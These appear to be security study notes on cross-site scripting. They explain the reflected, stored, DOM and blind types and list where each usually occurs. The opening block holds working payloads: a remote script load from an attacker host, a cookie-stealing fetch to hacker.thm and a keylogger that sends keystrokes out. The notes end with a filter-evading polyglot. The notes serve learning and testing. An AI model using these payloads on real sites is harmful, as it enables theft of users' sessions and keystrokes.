# XSS
inject malicious Javascript into a web application with the intention of being executed by other users.

```html
<script>alert("PWND");</script> # the most basic POC
<img src="ATTACKER_IP/pwnd"> # Test if you can reach your own machine
<script src="http://ATTACKER_IP/pwnd.js"></script> # get script from attacker server

#get cookie and send it to attacker by parameter
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> 

#keylogger
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>


```

## type
### Reflected XSS
Where user supplied input is included directly into the page, making it reflected. 
For example search input is directly displayed on the page, or an error include user supplied input.
Usually exist in:
-   Parameters in the URL Query String
-   URL File Path
-   Sometimes HTTP Headers (although unlikely exploitable in practice)

### Stored XSS
Javascript payload is saved in the server page, which will be run everytime the infected page is visited. 
For example a comment that is not sanitized for xss in a forum or blog.
Common location for stored XSS:
-   Comments on a blog
-   User profile information  
-   Website Listings

### DOM XSS
A normal Javascript is accessing a resource via DOM that an attacker can manipulate and exploit. The resource either will be loaded on a page or passed to an unsafe javascript methods such as eval().

### Blind XSS
Like stored, except you can't check the payload yourself. For example a contact form that is not filtered can only be checked by a staff in a private web portal.
https://xsshunter.com/ is tools for blind xss


## polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
